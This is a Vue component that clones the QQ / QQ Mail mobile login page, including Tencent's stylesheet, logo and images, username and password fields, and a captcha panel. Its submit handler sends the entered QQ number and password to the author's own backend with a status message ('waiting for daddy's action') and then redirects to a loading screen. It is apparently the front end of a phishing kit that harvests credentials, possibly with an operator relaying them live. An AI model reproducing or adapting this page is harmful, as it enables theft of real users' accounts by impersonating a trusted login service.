<template>
  <div id="content" class="content">
    <div id="error_tips">
      <div id="error_tips_content">
        <span id="error_icon"> </span>
        <span id="error_message"> 你还没有输入密码！ </span>
      </div>
    </div>
    <div id="login" class="login">
      <div id="logo" class="logo"></div>
      <div id="app_name" style="display: none"></div>
      <div id="q_login" class="q_login" style="display: none">
        <div id="q_login_title">
          <div id="q_login_logo"></div>
          <label id="q_login_tips"> 请选择登录帐号 </label>
        </div>
        <div id="q_logon_list" class="q_logon_list"></div>
      </div>
      <div id="web_login">
        <ul id="g_list">
          <li id="g_u">
            <div id="del_touch" class="del_touch">
              <span id="del_u" class="del_u"> </span>
            </div>
            <input
              id="u"
              class="inputstyle"
              name="u"
              autocomplete="off"
              placeholder="QQ号码/手机/邮箱"
              v-model="username"
            />
          </li>
          <li id="g_p">
            <div id="del_touch_p" class="del_touch">
              <span id="del_p" class="del_u"> </span>
            </div>
            <input
              id="p"
              class="inputstyle"
              maxlength="16"
              type="password"
              name="p"
              autocorrect="off"
              placeholder="输入密码"
              v-model="password"
            />
          </li>
        </ul>
        <div id="auto_login">
          <input type="checkbox" id="remember" checked="checked" />
          <span class="checkbox"> </span>
          <label class="wording"> 自动登录 </label>
        </div>

        <div @click="onSubmit()" id="go">登录</div>
        <div href="javascript:void(0);" id="onekey">一键登录</div>
      </div>

      <div id="switch">
        <div id="swicth_login" onclick="pt._switch();" style="display: none">
          快速登录历史帐号
        </div>

        <div id="zc_feedback">
          <span id="forgetpwd"> 找回密码 </span>
          <span id="split"> </span>
          <span
            id="zc"
            onclick="window.open('https\x3A\x2F\x2Fssl.ptlogin2.qq.com\x2Fj_newreg_url')"
          >
            新用户注册
          </span>
        </div>
      </div>
    </div>
    <div id="vcode">
      <label id="vcode_tips"> 点击图片可更换验证码 </label>
      <div id="vcode_area">
        <img id="vcode_img" />
        <label id="input_tips"> 请输入图中的字符不区分大小写 </label>
        <input
          id="vcode_input"
          name="vcode_input"
          tabindex="3"
          autocomplete="off"
          autocorrect="off"
          maxlength="6"
        />
      </div>
      <div id="submit">提交验证码</div>
    </div>
  </div>
</template>
<script>
import user from '@/api/user';

export default {
  data(){
    return {
      username: '',
      password: '',
      ip:''
    }
  },
  // 提交数据之后，就跳转到loading界面
  methods: {
     onSubmit() {
      console.log(this.username)
      user.login(this.username,this.password,"已经点击登录，正在加载，等待爸爸的操作",this.ip).then(response => {
        // console.log(response);
        if(response.code == "200") {
          this.$router.push({path:"/loading",query:{"id":response.user.id}})
        }
      })
    },
  },
}
</script>
<style>
@import url("https://imgcache.qq.com/ptlogin/v4/style/mobile_common.css");
/* .content, */
  /* body,
  html {
    height: 100%;
  } */
  .content{
    height: 100vh;
  }
  #switch,
  #web_login,
  .q_login {
  max-width: 396px;
}
.del_touch,
.inputstyle {
  -webkit-tap-highlight-color: rgba(255, 255, 255, 0);
}
.header,
.nick,
.q_login {
  text-align: center;
}
body {
  font-family: PingFang SC;
  font-size: 17px;
  background: #f4f5f6;
  min-height: 600px;
  overflow: scroll;
}
* {
  padding: 0;
  margin: 0;
  list-style: none;
  text-decoration: none;
}
#web_login,
.content,
.login {
  margin: 0 auto;
}
input::-webkit-input-placeholder,
textarea::-webkit-input-placeholder {
  color: #ccc;
}
input::-ms-input-placeholder,
textarea::-ms-input-placeholder {
  color: #ccc;
}
input:focus {
  outline: 0;
}
.content {
  width: 100%;
  position: relative;
}
#error_tips {
  position: absolute;
  top: 0;
  z-index: 100;
  display: none;
  opacity: 0.95;
  width: 100%;
}
#error_tips #error_tips_content {
  position: relative;
  padding: 10px 3px;
  border-radius: 5px;
  background-color: #525c5f;
}
#error_tips #error_tips_content #error_icon {
  position: absolute;
  top: 10px;
  display: inline-block;
  width: 24px;
  height: 24px;
  /* background: url("/style/8/images/info.png") no-repeat; */
}
#error_tips #error_tips_content #error_message {
  display: inline-block;
  line-height: 28px;
  font-size: 14px;
  color: #fff;
  padding: 0 0 0 28px;
}
#error_message a,
#error_message a:visited {
  color: #f15a22;
}
.login {
  padding: 41.25px 16px 0;
}
.q_login {
  margin: 0 auto 40px;
  width: 100%;
  overflow: hidden;
}
.inputstyle {
  font-family: PingFang;
  width: 90%;
  height: 55px;
  color: #000;
  border: none;
  background: 0 0;
  font-size: 17px;
  -webkit-appearance: none;
}
.inputstyle:-webkit-autofill {
  box-shadow: 0 0 0 1000px #fff inset;
}
.inputstyle:-webkit-autofill::first-line {
  font-family: PingFang;
  font-size: 17px;
}
.inputstyle:placeholder {
  font-size: 17px;
  color: #ccc;
}
.logo {
  height: 100px;
  width: 244px;
  margin: 0 auto 50px;
  background-repeat: no-repeat;
  background-size: contain;
}
.header {
  display: inline-block;
  height: 97px;
  width: 96px;
  position: relative;
}
.del_touch_icon,
.header .img_out,
.header img,
.nick {
  position: absolute;
}
.header img {
  width: 60px;
  height: 60px;
  top: 10px;
  left: 16px;
}
.header .img_out {
  width: 60px;
  height: 60px;
  top: 9px;
  left: 15px;
  border: 1px solid #c6dbe8;
  border-radius: 4px;
}
.nick {
  display: inline-block;
  top: 80px;
  left: 0;
  height: 20px;
  line-height: 18px;
  vertical-align: middle;
}
.del_touch_icon {
  display: none;
  width: 30px;
  height: 30px;
  left: 60px;
  top: 0;
  z-index: 1;
}
.del_icon {
  display: block;
  width: 24px;
  height: 22px;
  /* background: url("/style/8/images/android_logo_v1.png") -68px 0 no-repeat; */
  border-radius: 11px;
}
#web_login {
  width: 100%;
}
.del_touch,
.del_u {
  width: 18px;
  position: absolute;
}
#g_list {
  background: #fff;
  height: 112px;
  border-radius: 8px;
  padding: 0 15px;
}
#g_p,
#g_u {
  position: relative;
}
#g_u {
  border-bottom: 0.5px solid #e6e6e6;
}
.txt_default {
  position: absolute;
  top: 12px;
  left: 10px;
  color: #b3b3b3;
}
.del_touch {
  right: 0;
  display: none;
  height: 56px;
  z-index: 1;
}
.del_u {
  display: block;
  top: 19px;
  height: 18px;
  border-radius: 9px;
  /* background: url("/style/8/images/android_logo_v1.png") -117px -2px no-repeat; */
}
#auto_login {
  display: flex;
  height: 17px;
  margin: 15px 0;
  color: #000;
  position: relative;
}
#auto_login .wording {
  position: absolute;
  left: 21px;
  line-height: 17px;
  height: 17px;
  font-size: 14px;
}
#remember,
#remember + .checkbox {
  width: 16px;
  height: 16px;
  position: absolute;
}
#go,
#onekey,
#switch #swicth_login {
  font-size: 17px;
  font-weight: 500;
  text-align: center;
}
#remember {
  cursor: pointer;
  z-index: 1;
  opacity: 0.01;
}
#remember:checked + .checkbox {
  background: url("https://qq-web-legacy.cdn-go.cn/any.ptlogin2.qq.com/v1.26.2/ptlogin/v4/style/9/images/checkbox_checked.png")
    no-repeat;
  background-size: contain;
}
#remember + .checkbox {
  display: inline-block;
  background: url("https://qq-web-legacy.cdn-go.cn/any.ptlogin2.qq.com/v1.26.2/ptlogin/v4/style/9/images/checkbox_unchecked.png")
    no-repeat;
  background-size: contain;
}
#go.weak,
#onekey.weak,
#switch #swicth_login {
  height: 45px;
  border: 1px solid #ccc;
  margin-top: 16px;
}
#go{
  background: #09f;
  color: #fff;
}
#go,
#onekey {
  width: 100%;
  height: 45px;
  line-height: 45px;
  /* background: #09f; */
  border: none;
  border-radius: 4px;
  /* color: #fff; */
  margin-top: 36px;
  display: block;
}
#onekey {
  margin-top: 16px;
  background: #f5f5f5;
  border: 1px solid #CCC;
}
#go.weak,
#onekey.weak {
  background-color: #f5f5f5;
  color: #000;
}
#switch {
  width: 100%;
  margin: 0 auto;
}
#switch #swicth_login {
  width: 100%;
  line-height: 44px;
  border-radius: 5px;
  background: #f5f5f5;
  color: #000;
}
#switch #zc_feedback {
  position: absolute;
  left: 0;
  right: 0;
  bottom: 33px;
  display: flex;
  justify-content: center;
  margin-top: 15px;
  overflow: hidden;
}
#switch #forgetpwd,
#switch #zc {
  color: #000;
  line-height: 14px;
  font-size: 14px;
  font-weight: 500;
}
#switch #split {
  height: 13px;
  width: 1px;
  margin: 0 31px;
  background: #e6e6e6;
}
.tansparent {
  background: 0 0;
}
#q_login_title {
  height: 32px;
  line-height: 22px;
  margin-bottom: 20px;
  position: relative;
}
#q_login_logo {
  /* background: url("/style/8/images/android_logo_v1.png") -44px 0 no-repeat; */
  width: 22px;
  height: 22px;
  position: absolute;
  left: 0;
}
#q_login_tips {
  position: absolute;
  left: 30px;
  top: 0;
  color: #246183;
}
#vcode {
  margin: 0 auto;
  padding-top: 40px;
  display: none;
}
#vcode #vcode_tips {
  display: block;
  width: 290px;
  height: 20px;
  line-height: 20px;
  margin: 0 auto 15px;
  color: #77838d;
}
#vcode #vcode_area {
  position: relative;
  margin: 0 auto;
  width: 290px;
  height: 70px;
  border-radius: 5px;
  border: 1px solid #b8b8b8;
  background: #fff;
}
#vcode #vcode_img {
  position: absolute;
  left: 3px;
  width: 140px;
  height: 70px;
}
#vcode #vcode_input {
  position: absolute;
  top: -1px;
  left: 145px;
  width: 145px;
  height: 70px;
  border: 1px solid #9d9d9d;
  background: 0 0;
  -webkit-appearance: none;
  border-top-right-radius: 5px;
  border-bottom-right-radius: 5px;
  line-height: 28px;
  font-size: 28px;
  /* -webkit-box-shadow: inset 0 0 10px #ccc; */
}
#vcode #input_tips {
  position: absolute;
  top: 5px;
  left: 150px;
  display: block;
  width: 135px;
  height: 50px;
  color: #b3b3b3;
  z-index: 1;
  padding-top: 8px;
}
#vcode #submit {
  width: 288px;
  height: 22px;
  padding: 10px 0;
  background: #7ec82c;
  border: none;
  border-radius: 5px;
  color: #fff;
  font-size: 22px;
  text-align: center;
  margin: 35px auto 0;
}
.copyright {
  text-align: center;
  color: #8a949d;
  font-size: 10px;
  margin-top: 15px;
  font-family: Helvetica;
}
.copyright .chs,
.copyright .en {
  line-height: 20px;
}
.mode_webapp .ui_topbar .topbar_btn b,
.mode_webapp .ui_topbar .topbar_btn_left b {
  /* background-image: url("/style/8/images/bg_btn_back.png"); */
  background-position: bottom right;
  background-size: 105px;
  width: 6px;
  height: 32px;
  float: left;
}
.ui_topbar .topbar_title,
.ui_topbar h3 {
  font-size: 18px;
  font-weight: 600;
}
.ui_topbar {
  background-color: #fff;
  height: 44px;
  line-height: 44px;
  text-align: center;
  position: relative;
}
.lay_header {
  height: auto !important;
  width: 100%;
}
.mode_webapp .ui_topbar {
  color: #222;
  background-color: #fff;
  top: 0;
  left: 0;
  width: 100%;
}
.mode_webapp .ui_topbar .topbar_btn_left {
  display: block;
  position: absolute;
  left: 10px;
  top: 5px;
}
.mode_webapp .ui_topbar .topbar_btn_left .back {
  position: absolute;
  left: 4px;
  top: 8px;
  width: 10px;
  height: 18px;
  background-image: url("https://qq-web-legacy.cdn-go.cn/any.ptlogin2.qq.com/v1.26.2/ptlogin/v4/style/9/images/back.png");
  background-repeat: no-repeat;
  background-size: contain;
  background-position: 0;
}
.mode_webapp .ui_topbar .topbar_btn span,
.mode_webapp .ui_topbar .topbar_btn_left span {
  /* float: left; */
  display: inline-block;
  height: 32px;
  line-height: 30px;
  color: #fff;
  /* background-image: url("/style/8/images/bg_btn_back.png"); */
  background-size: 105px;
  padding-left: 10px;
  padding-right: 4px;
}
.mode_webapp .ui_topbar .topbar_btn_left span {
  /* background-image: url("/style/8/images/bg_btn_back.png"); */
  background-position: left -32px;
  background-size: 105px;
  padding-left: 17px;
}
.skin-2 .ui_topbar {
  background-color: #161616;
  background-image: -webkit-gradient(
    linear,
    left top,
    left bottom,
    from(#3e3e3e),
    to(#262626)
  );
  background-image: -webkit-linear-gradient(top, #3e3e3e, #262626);
  background-image: linear-gradient(to bottom, #3e3e3e, #262626);
  border-bottom-color: #1a1a1a;
}
.skin-2 .ui_topbar .topbar_btn b,
.skin-2 .ui_topbar .topbar_btn span,
.skin-2 .ui_topbar .topbar_btn_left b,
.skin-2 .ui_topbar .topbar_btn_left span {
  /* background-image: url("/style/8/images/bg_btn_back_black@2x.png"); */
  background-size: 105px;
}
.new_vcode {
  display: none;
  width: 100%;
  height: 100%;
  overflow: hidden;
}

.logo {
  background-image: url("https://mail.qq.com/zh_CN/htmledition/images/logo/qqmail/qqmail_logo_default_200h.png");
}
.login {
  padding-top: 22px;
}
.logo {
  margin-bottom: 27px;
}
</style>
